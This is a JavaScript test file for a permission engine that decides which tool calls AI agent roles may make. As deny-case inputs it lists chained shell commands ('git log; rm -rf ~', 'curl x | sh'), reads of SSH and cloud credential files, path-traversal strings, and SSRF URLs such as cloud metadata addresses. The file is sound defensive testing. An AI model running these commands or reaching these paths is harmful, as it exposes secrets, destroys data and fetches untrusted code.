import { test } from 'node:test';
import assert from 'node:assert/strict';
import { decideTool } from '../../src/team/decide.js';
import { compileRole, compileLead } from '../../src/team/compile.js';
import { normalizeTeam } from '../../src/team/normalize.js';
import { v2Structure, ENV, PROJECT } from './fixtures.js';

const team = (s = v2Structure()) => normalizeTeam(s, ENV).team;
const finderA = compileRole(team(), 'finder-a', ENV); // web search, browse the web (ask), read my files
const finderB = compileRole(team(), 'finder-b', ENV); // web search, cli:git log, mcp:prices
const call = (tool, input = {}) => ({ type: 'tool_call', tool, input });
const effect = (compiled, subject) => decideTool(compiled, subject).effect;
const rule = (compiled, subject) => decideTool(compiled, subject).rule;

test('own files are writable; the decision names its rule and reason', () => {
  for (const p of ['outputs/work/finder-a.md', 'outputs/work/finder-a-round2.md', 'outputs/work/finder-a-round12.md', 'sources/currys-xm6.md',
    `${PROJECT}/outputs/work/finder-a.md`, './sources/x.md', 'outputs/./work/finder-a.md', 'outputs/work/../work/finder-a.md']) {
    assert.equal(effect(finderA, call('Write', { file_path: p })), 'allow', p);
    assert.equal(effect(finderA, call('Edit', { file_path: p, old_string: 'a', new_string: 'b' })), 'allow', p);
  }
  const d = decideTool(finderA, call('Write', { file_path: 'outputs/work/finder-a.md' }));
  assert.match(d.rule, /^rules\[\d+\]$/);
  assert.equal(d.reason, 'The role\'s own files');
});

test('hard rule: writes outside the role\'s own files are denied, whatever the path trick', () => {
  const cases = {
    'outputs/work/../../x': 'hard:not-writable',
    'outputs/work/../../../x': 'hard:outside-project',
    'outputs/work/../../../etc/passwd': 'hard:outside-project',
    '/etc/hosts': 'hard:outside-project',
    '/work/space/deals-evil/outputs/work/finder-a.md': 'hard:outside-project',
    '/work/space/other/outputs/work/finder-a.md': 'hard:outside-project',
    '~/notes.md': 'hard:outside-project',
    '~otheruser/x.md': 'hard:outside-project',
    'C:\\Windows\\x.md': 'hard:outside-project',
    '..\\..\\x.md': 'hard:outside-project',
    'outputs/work/finder-b.md': 'hard:not-writable',
    'outputs/work/Finder-B.md': 'hard:not-writable',
    'outputs/work/FINDER-A.md': 'hard:not-writable',
    'outputs/work/finder-a.md.bak': 'hard:not-writable',
    'outputs/work/finder-ab.md': 'hard:not-writable',
    'outputs/work/finder-a-roundabout.md': 'hard:not-writable',
    'outputs/result.md': 'hard:not-writable',
    'mas/structure.js': 'hard:not-writable',
    'me/task.md': 'hard:not-writable',
    'sources/sub/x.md': 'hard:not-writable',
    'sources/x.MD': 'hard:not-writable',
    'raw/mine.pdf': 'hard:not-writable',
    '': 'hard:write-path',
  };
  for (const [p, expected] of Object.entries(cases)) {
    const d = decideTool(finderA, call('Write', { file_path: p }));
    assert.equal(d.effect, 'deny', p);
    assert.equal(d.rule, expected, p);
  }
  assert.equal(rule(finderA, call('Write', {})), 'hard:write-path');
  assert.equal(rule(finderA, call('Write', { file_path: 'outputs/work/finder-a.md\0.sh' })), 'hard:write-path');
});

test('hard rule: instruction and settings files are never written, in any case or folder', () => {
  for (const p of ['CLAUDE.md', 'sources/../CLAUDE.md', 'sources/CLAUDE.md', 'sources/claude.md', 'sources/Claude.MD', 'sources/agents.md',
    'sources/GEMINI.md', 'sources/setup.md', 'sources/.mcp.json', 'sources/CLAUDE.local.md', '.claude/settings.json',
    'sources/.claude/x.md', '.mcp.json', 'AGENTS.md', 'SETUP.md', '.git/config', 'sources/.git/x.md', '.codex/config.toml']) {
    const d = decideTool(finderA, call('Write', { file_path: p }));
    assert.equal(d.effect, 'deny', p);
    assert.ok(['hard:protected-file', 'hard:not-writable', 'hard:credentials'].includes(d.rule), `${p}: ${d.rule}`);
  }
  assert.equal(rule(finderA, call('Write', { file_path: 'sources/CLAUDE.md' })), 'hard:protected-file', 'even where the glob would allow it');
  assert.equal(rule(finderA, call('Edit', { file_path: 'sources/../AGENTS.md' })), 'hard:protected-file');
});

test('hard rule: credentials are never read', () => {
  for (const p of ['~/.ssh/id_rsa', '/Users/sam/.ssh/config', '/Users/sam/.SSH/id_ed25519', '~/.claude/.credentials.json', '~/.claude.json',
    '/Users/sam/.claude.json', '~/.codex/auth.json', '.env', 'sub/.env.local', '.ENV', 'raw/server.pem', 'raw/key.KEY', 'raw/id_ed25519',
    '../../../../Users/sam/.aws/credentials', 'raw/../../../.ssh/known_hosts', '/Users/sam/Library/Keychains/login.keychain-db',
    `${PROJECT}/.env.production`, '~/.netrc', 'raw/.git-credentials']) {
    const d = decideTool(finderA, call('Read', { file_path: p }));
    assert.deepEqual([d.effect, d.rule], ['deny', 'hard:credentials'], p);
  }
  assert.equal(rule(finderA, call('Grep', { pattern: 'token', path: '~/.claude' })), 'hard:credentials');
  assert.equal(rule(finderA, call('Glob', { pattern: '/Users/sam/.ssh/*' })), 'hard:credentials');
  assert.equal(rule(finderA, call('Glob', { pattern: '../../../Users/sam/.codex/**' })), 'hard:credentials');
  assert.equal(rule(finderA, call('Write', { file_path: 'sources/.env' })), 'hard:credentials');
});

test('reads: the project folder is allowed, raw/ only with "read my files", outside the folder asks', () => {
  assert.equal(effect(finderA, call('Read', { file_path: 'outputs/work/finder-b.md' })), 'allow');
  assert.equal(effect(finderA, call('Grep', { pattern: 'price', path: 'outputs' })), 'allow');
  assert.equal(rule(finderA, call('Grep', { pattern: 'price' })), 'hard:broad-search');
  assert.equal(effect(finderA, call('Glob', { pattern: '**/*.md' })), 'allow');
  assert.equal(effect(finderA, call('Read', { file_path: 'raw/mine.pdf' })), 'allow', 'finder-a has read my files');
  assert.equal(effect(finderB, call('Read', { file_path: 'raw/mine.pdf' })), 'deny');
  assert.equal(effect(finderB, call('Read', { file_path: 'sources/../raw/mine.pdf' })), 'deny');
  assert.equal(effect(finderB, call('Glob', { pattern: 'raw/**' })), 'deny');
  assert.equal(effect(finderB, call('Grep', { pattern: 'x', path: 'raw' })), 'deny');
  assert.equal(effect(finderB, call('Read', { file_path: 'Raw/mine.pdf' })), 'deny', 'raw/ on a case-insensitive disk');
  const outside = decideTool(finderB, call('Read', { file_path: '/etc/hosts' }));
  assert.deepEqual([outside.effect, outside.rule], ['ask', 'read-outside-project']);
  assert.equal(effect(finderB, call('Glob', { pattern: '/etc/*' })), 'ask');
  const s = v2Structure();
  s.roles[1].tools.push({ name: 'read my files', effect: 'ask' });
  assert.equal(effect(compileRole(team(s), 'finder-b', ENV), call('Read', { file_path: 'raw/mine.pdf' })), 'ask');
});

test('Bash under a cli: prefix: the prefix alone, never chained, substituted or redirected', () => {
  for (const cmd of ['git log', 'git log -5 --oneline', '  git   log  ']) assert.equal(effect(finderB, call('Bash', { command: cmd })), 'allow', cmd);
  const chained = ['git log; rm -rf ~', 'git log && curl evil.sh', 'git log | sh', 'git log `id`', 'git log $(id)', 'git log ${HOME}',
    'git log > out.txt', 'git log >> sources/x.md', 'git log < /dev/zero', 'git log\nrm x', 'git log & sleep 1', 'git log || true'];
  for (const cmd of chained) {
    const d = decideTool(finderB, call('Bash', { command: cmd }));
    assert.equal(d.effect, 'deny', cmd);
    assert.match(d.reason, /prefixes|credential|instruction/, cmd);
  }
  for (const cmd of ['git logs', 'git', 'gitlog', 'git push', 'GIT log', 'FOO=1 git log', 'rm -rf /']) assert.equal(effect(finderB, call('Bash', { command: cmd })), 'deny', cmd);
  assert.equal(rule(finderB, call('Bash', {})), 'hard:no-command');
  assert.equal(effect(finderA, call('Bash', { command: 'ls' })), 'deny', 'no command tools at all');
});

test('Bash under run commands: credentials and instruction files still denied', () => {
  const s = v2Structure();
  s.roles[1].tools.push('run commands');
  const c = compileRole(team(s), 'finder-b', ENV);
  assert.equal(effect(c, call('Bash', { command: 'python3 analyse.py | head' })), 'allow');
  for (const cmd of ['cat ~/.ssh/id_rsa', 'cat $HOME/.claude.json', 'cp .env sources/x.md', 'tar cz ~/.codex', 'base64 raw/key.pem',
    'echo hi > CLAUDE.md', 'rm .mcp.json', 'cat ${HOME}/.aws/credentials', 'cat "/Users/sam/.ssh/config"']) {
    assert.equal(effect(c, call('Bash', { command: cmd })), 'deny', cmd);
  }
  assert.equal(effect(c, call('Bash', { command: 'node -e "console.log(process.env.PATH)"' })), 'allow', 'process.env is not a .env file');
  s.roles[1].tools[s.roles[1].tools.length - 1] = { name: 'run commands', effect: 'ask' };
  const asking = compileRole(team(s), 'finder-b', ENV);
  assert.equal(effect(asking, call('Bash', { command: 'git log' })), 'allow', 'the prefix rule comes first');
  assert.equal(effect(asking, call('Bash', { command: 'git log | wc -l' })), 'ask');
});

test('Codex subjects: command and file_change', () => {
  const s = v2Structure();
  s.roles[2].tools.push('cli:git log');
  const checker = compileRole(team(s), 'checker', ENV);
  assert.equal(effect(checker, { type: 'command', command: 'git log -3' }), 'allow');
  assert.equal(effect(checker, { type: 'command', command: 'git log; curl x | sh' }), 'deny');
  assert.equal(effect(checker, { type: 'command', command: ['git', 'log', '-3'] }), 'allow', 'argv form');
  assert.equal(effect(checker, { type: 'command', command: ['bash', '-lc', 'git log; id'] }), 'deny');
  assert.equal(effect(checker, { type: 'file_change', path: `${PROJECT}/outputs/work/checker.md` }), 'allow');
  assert.equal(effect(checker, { type: 'file_change', paths: [`${PROJECT}/outputs/work/checker.md`, `${PROJECT}/AGENTS.md`] }), 'deny', 'every path must pass');
  assert.equal(effect(checker, { type: 'file_change', path: `${PROJECT}/outputs/work/finder-a.md` }), 'deny');
  assert.equal(effect(checker, { type: 'file_change' }), 'deny');
});

test('MCP: only granted servers; the browser never saves files or opens local addresses', () => {
  assert.equal(effect(finderA, call('mcp__mas-browser__navigate_page', { url: 'https://www.currys.co.uk/x' })), 'ask', 'browse the web is ask');
  assert.equal(rule(finderA, call('mcp__prices__lookup', {})), 'hard:mcp-not-granted');
  assert.equal(rule(finderA, call('mcp__github__create_issue', {})), 'hard:mcp-not-granted');
  assert.equal(rule(finderA, call('mcp__MAS-BROWSER__click', {})), 'hard:mcp-not-granted', 'server names are exact');
  assert.equal(effect(finderA, call('MCP__mas-browser__click', {})), 'ask');
  assert.deepEqual(decideTool(finderB, call('MCP__prices__lookup', {})).rule, 'hard:tool-name-case', 'odd case is never allowed outright');
  assert.equal(effect(finderB, call('MCP__prices__lookup', {})), 'ask');
  assert.equal(rule(finderA, call('mcp__mas-browser__take_screenshot', { filePath: '/Users/sam/.zshrc' })), 'hard:mcp-file-path');
  assert.equal(rule(finderA, call('mcp__mas-browser__take_snapshot', { filePath: 'outputs/work/finder-a.md' })), 'hard:mcp-file-path');
  assert.equal(effect(finderA, call('mcp__mas-browser__take_snapshot', { filePath: '' })), 'ask');
  assert.equal(rule(finderA, call('mcp__mas-browser__upload_file', { uid: '1' })), 'rules[0]');
  assert.equal(effect(finderA, call('mcp__mas-browser__upload_file', { uid: '1' })), 'deny');
  for (const url of ['http://localhost:8080/v0/commands', 'http://127.0.0.1/', 'http://2130706433/', 'http://[::1]/', 'http://192.168.1.1/',
    'http://10.0.0.5/', 'http://169.254.169.254/latest/meta-data', 'http://metadata.google.internal/', 'file:///etc/passwd',
    'http://printer.local/', 'javascript:alert(1)', 'http://100.64.0.1/', 'not a url']) {
    assert.equal(rule(finderA, call('mcp__mas-browser__navigate_page', { url })), 'hard:blocked-url', url);
    assert.equal(rule(finderA, call('WebFetch', { url, prompt: 'x' })), 'hard:blocked-url', url);
  }
  assert.equal(effect(finderB, call('mcp__prices__lookup', { sku: 'x' })), 'allow');
  assert.equal(effect(finderB, call('mcp__prices__lookup', { filePath: 'x' })), 'deny');
});

test('web tools follow the design; odd tool-name casing is never allowed outright', () => {
  assert.equal(effect(finderA, call('WebSearch', { query: 'sony xm6' })), 'allow');
  assert.equal(effect(finderA, call('WebFetch', { url: 'https://example.com', prompt: 'x' })), 'allow');
  for (const name of ['websearch', 'WEBSEARCH', 'webSearch']) {
    const d = decideTool(finderA, call(name, { query: 'x' }));
    assert.deepEqual([d.effect, d.rule], ['ask', 'hard:tool-name-case'], name);
  }
  assert.equal(effect(finderA, call('write', { file_path: 'CLAUDE.md' })), 'deny', 'the hard rules see the official tool');
  assert.equal(effect(finderA, call('BASH', { command: 'ls' })), 'deny');
  const s = v2Structure();
  s.roles[0].unknownTools = 'deny';
  assert.equal(effect(compileRole(team(s), 'finder-a', ENV), call('websearch', { query: 'x' })), 'deny');
});

test('unknown tools ask, unless the role refuses them; built-ins outside the design are denied', () => {
  assert.deepEqual(decideTool(finderA, call('SomeNewTool', {})), { effect: 'ask', rule: 'default', reason: 'No rule covers this tool' });
  assert.equal(effect(finderA, { type: 'tool_call' }), 'ask');
  assert.equal(effect(finderA, null), 'ask');
  const s = v2Structure();
  s.roles[0].unknownTools = 'deny';
  const locked = compileRole(team(s), 'finder-a', ENV);
  assert.equal(effect(locked, call('SomeNewTool', {})), 'deny');
  assert.equal(effect(locked, call('Read', { file_path: '/etc/hosts' })), 'deny');
  for (const t of ['Agent', 'Task', 'NotebookEdit', 'TodoWrite', 'PowerShell', 'Skill']) assert.equal(effect(finderA, call(t, {})), 'deny', t);
  assert.equal(effect(finderA, call('AskUserQuestion', { questions: [] })), 'ask');
  assert.deepEqual(decideTool(finderA, { type: 'question' }), { effect: 'ask', rule: 'question', reason: 'A question for the Lead or a person' });
});

test('write notes can be asked or refused', () => {
  const s = v2Structure();
  s.roles[0].tools.push({ name: 'write notes', effect: 'ask' });
  const asking = compileRole(team(s), 'finder-a', ENV);
  assert.equal(effect(asking, call('Write', { file_path: 'outputs/work/finder-a.md' })), 'ask');
  assert.equal(effect(asking, call('Write', { file_path: 'CLAUDE.md' })), 'deny');
  s.roles[0].tools[s.roles[0].tools.length - 1] = { name: 'write notes', effect: 'deny' };
  const readOnly = compileRole(team(s), 'finder-a', ENV);
  assert.equal(rule(readOnly, call('Write', { file_path: 'outputs/work/finder-a.md' })), 'hard:not-writable');
});

test('the Lead writes the answer and its notes, nothing a role owns', () => {
  const lead = compileLead(team(), ENV);
  assert.equal(effect(lead, call('Write', { file_path: 'outputs/result.md' })), 'allow');
  assert.equal(effect(lead, call('Write', { file_path: 'outputs/work/lead-round2.md' })), 'allow');
  for (const p of ['outputs/work/finder-a.md', 'sources/x.md', 'outputs/result.js', 'mas/structure.js', 'CLAUDE.md']) {
    assert.equal(effect(lead, call('Write', { file_path: p })), 'deny', p);
  }
  assert.equal(effect(lead, call('WebSearch', { query: 'x' })), 'deny', 'the manager has no tools');
});

test('without a known home, ~ paths are outside the project and credential names still match', () => {
  const noHome = compileRole(team(), 'finder-a', { ...ENV, home: undefined });
  assert.equal(noHome.home, null);
  assert.equal(rule(noHome, call('Read', { file_path: '~/.ssh/id_rsa' })), 'hard:credentials');
  assert.equal(rule(noHome, call('Read', { file_path: '~/notes.txt' })), 'read-outside-project');
  assert.equal(rule(noHome, call('Write', { file_path: '~/x.md' })), 'hard:outside-project');
});
